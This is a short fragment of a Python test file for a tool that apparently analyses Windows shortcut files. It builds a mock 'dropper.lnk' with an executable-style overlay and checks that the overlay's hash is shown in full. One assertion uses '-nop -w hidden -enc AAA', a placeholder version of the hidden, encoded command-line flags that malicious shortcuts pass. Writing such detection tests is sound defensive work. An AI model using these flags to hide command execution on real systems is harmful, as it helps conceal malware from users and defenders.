    assert visualise_padding("-nop -w hidden -enc AAA") == "-nop -w hidden -enc AAA"
    assert visualise_padding("") == ""


def test_overlay_sha256_renders_in_full(tmp_path):
    """A truncated hash cannot be pasted into VirusTotal."""
    path = tmp_path / "dropper.lnk"
    path.write_bytes(build_lnk(arguments="/c findstr x", overlay=b"MZ" + b"\x00" * 400))
    data = run(path, {})["data"]

    sha = data["overlay"]["sha256"]
    assert len(sha) == 64
    values = " ".join(row.value for row in lnk_rows(data, 2))
    assert data["overlay"]["description"] in values
